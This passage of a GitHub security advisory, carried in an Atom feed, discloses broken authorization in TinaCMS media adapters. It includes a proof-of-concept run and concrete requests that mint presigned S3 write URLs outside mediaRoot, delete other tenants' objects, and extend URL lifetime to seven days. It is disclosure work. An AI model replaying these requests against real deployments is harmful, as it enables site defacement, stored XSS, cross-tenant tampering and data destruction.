<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>deleteAsset</code> calls <code>cloudinary.uploader.destroy(public_id)</code> over the attacker-chosen second segment, deleting any asset in the cloud. The same handler's <code>listMedia</code> (line 110) interpolates <code>mediaListOptions.directory</code> directly into a Cloudinary search-expression DSL string (<code>folder="${directory}"</code>), giving an authorized user full search-expression injection — out of scope for this finding but worth a separate report.</li>
</ul>
<h2 id="reproduction-validated-locally">Reproduction (validated locally)</h2>
<p>Environment: Node 22, <code>@aws-sdk/client-s3@3.665.0</code>, <code>@aws-sdk/s3-request-presigner@3.665.0</code>, <code>aws-sdk-client-mock@4.1.0</code>. The harness vendors <code>createMediaHandler</code> byte-for-byte from <code>packages/next-tinacms-s3/src/handlers.ts</code> and runs it against a mocked <code>S3Client</code>. The AWS SDK signs the URL identically whether the bucket exists — the resulting URL is the same one a real S3 deployment would hand back to the editor's browser, so it would PUT against a real bucket without further help.</p>
<p>PoC layout under <code>/Users/admin/joplin_research/tinacms-s3-poc/</code>:</p>
<pre><code>package.json            (deps only)
handler-vendored.mjs    (verbatim copy of createMediaHandler, types stripped)
poc.mjs                 (four exhibits exercising the handler)
</code></pre>
<p>Handler is configured the way the package's <code>README</code> documents:</p>
<pre><code class="language-js">const handler = createMediaHandler({
  config: { region: 'us-east-1', credentials: { accessKeyId: '…', secretAccessKey: '…' } },
  bucket: 'editor-media-bucket',
  mediaRoot: 'media',                 // editors are "scoped to media/"
  authorized: async () =&gt; true,       // typical wiring: TinaCloud verified user
});
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">$ cd /Users/admin/tinacms-s3-poc &amp;&amp; node poc.mjs
--- Exhibit A: presigned PUT URL for arbitrary bucket key ---
  HTTP status : 200
  signedUrl   : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Credential=AKIAFA...
  src         : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html
  signed Key  : /index.html
  RESULT      : BYPASS  (signed URL writes outside media/)

--- Exhibit B: cross-tenant overwrite via attacker-chosen key ---
  signed Key  : /tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (cross-tenant write primitive granted)

--- Exhibit C: arbitrary-key DELETE via [...media] route ---
  HTTP status : 200
  S3 Bucket   : editor-media-bucket
  S3 Key      : tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (arbitrary-key DELETE granted)

--- Exhibit D: attacker-controlled ?expiresIn ---
  X-Amz-Expires: 604800 sec
  RESULT       : BYPASS  (URL valid far longer than the 1h default)
</code></pre>
<p>Verification, in detail:</p>
<ol>
<li><p><strong>Exhibit A</strong> — <code>GET /api/s3/media?key=index.html</code>. <code>mediaRoot=media/</code> is configured but never consulted on the write path. The handler hands back a SigV4 URL whose path is <code>/index.html</code>. PUT'ing any body to that URL would create the bucket-root object <code>index.html</code> against the operator's IAM credentials. For a deployment that fronts the bucket with CloudFront / S3-website hosting, this is a one-shot site-defacement primitive (and, for any CSP that trusts the bucket, a one-shot stored-XSS primitive against the published site).</p>
</li>
<li><p><strong>Exhibit B</strong> — same primitive, attacker-chosen key <code>tenant-victim/posts/announcement.mdx</code>. In the multi-tenant TinaCloud / TinaCMS Cloud deployment shape (one bucket shared across tenants, each tenant assigned a <code>mediaRoot/&lt;tenant&gt;/</code> prefix), a Tenant A editor receives a presigned PUT URL for any Tenant B key. Cross-tenant content tampering with no further bug needed.</p>
</li>
<li><p><strong>Exhibit C</strong> — <code>DELETE /api/s3/media/anything-here-is-ignored/tenant-victim%2Fposts%2Fannouncement.mdx</code>. The handler reads the catch-all as <code>req.query.media = ['anything-here-is-ignored', 'tenant-victim/posts/announcement.mdx']</code>, destructures to <code>objectKey = media[1]</code>, dispatches <code>DeleteObjectCommand({ Bucket: 'editor-media-bucket', Key: 'tenant-victim/posts/announcement.mdx' })</code>. The mock confirms the captured command's <code>Key</code> is the attacker-supplied string. Real S3 will honour the same call. (The mock-captured call confirms the <em>handler's</em> behaviour; the real S3 call requires only <code>s3:DeleteObject</code> on the bucket, which the package's <code>README</code> instructs operators to grant.)</p>
</li>
<li><p><strong>Exhibit D</strong> — <code>?expiresIn=604800</code> (7 days, the SigV4 ceiling). The handler accepts it, the resulting <code>X-Amz-Expires=604800</code>. Combined with Exhibit A, an attacker who briefly compromises a CMS session (e.g. via a stolen idle browser session or the dev-server CSRF write described in finding 06) can mint a long-lived offline write primitive — usable for a week with no further interaction with the CMS.</p>
</li>
</ol>
<p>The four exhibits together: cross-mediaRoot write, cross-tenant write, arbitrary-key delete, and long-lived signed-URL minting.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cross-tenant / cross-mediaRoot write.</strong> In any deployment where the bucket holds anything other than this one editor's <code>mediaRoot</code> (multi-tenant TinaCloud, shared corporate bucket, bucket-backed static site), an authorized editor obtains write authority over every key the IAM credential can reach. Concretely: defacement of a static site fronted by the bucket; cross-tenant content tampering; replacement of <code>*.html</code>, <code>*.js</code>, <code>*.json</code> assets that downstream consumers trust. (Exhibits A, B; <code>handlers.ts:67-90</code>.)</li>
<li><strong>Stored XSS via uploaded HTML.</strong> S3 returns objects with the <code>Content-Type</code> the upload supplies. The presigned <code>PutObjectCommand</code> URL carries no <code>Content-Type</code> constraint — the attacker's <code>PUT</code> chooses it. An editor can therefore write an HTML / SVG / JS payload to the bucket-root, and any CDN or origin that serves bucket objects directly to an authenticated SaaS surface inherits stored XSS in that origin.</li>
<li><strong>Arbitrary-key delete (data destruction).</strong> Through <code>[...media]</code> the handler treats the second URL segment as a free-form object key. An editor can wipe any object the IAM key can <code>s3:DeleteObject</code>, including non-media artefacts like deployment manifests, backups, or other tenants' files. (Exhibit C; <code>handlers.ts:199-223</code>.)</li>
<li><strong>Bucket-policy implications.</strong> The <code>README</code> (lines 38-90) tells operators to grant the IAM key <code>s3:PutObject</code>, <code>s3:PutObjectAcl</code>, <code>s3:DeleteObject</code>, and <code>s3:ListBucket</code> on the <em>whole</em> bucket. The README implies the application code constrains the editor's actions to <code>mediaRoot</code>. Because the application code does not, every operator who follows the README has — without realising — granted every CMS editor full write/delete on the whole bucket.</li>
<li><strong>Long-lived offline write primitive.</strong> <code>expiresIn</code> is attacker-controlled and not capped by the handler. A single GET request mints a URL valid for up to 7 days (AWS SigV4 ceiling). An attacker who briefly compromises a CMS session can stash one such URL and continue writing arbitrary objects long after the session is revoked. (Exhibit D.)</li>
<li><strong>Same-shape exposure on every other first-party media adapter.</strong> <code>next-tinacms-dos</code> (DigitalOcean Spaces, S3-compatible), <code>next-tinacms-azure</code> (Blob Storage), and <code>next-tinacms-cloudinary</code> (Cloudinary) all duplicate the broken pattern. Azure has <em>no</em> mediaRoot config at all, so the boundary that <code>next-tinacms-s3</code> advertises but doesn't enforce isn't even nominally present in <code>next-tinacms-azure</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7088">https://github.com/tinacms/tinacms/pull/7088</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce">https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4">https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59992">https://nvd.nist.gov/vuln/detail/CVE-2026-59992</a></li>
<li><a href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-19T21:56:30.000Z</published>
    </entry>
</feed>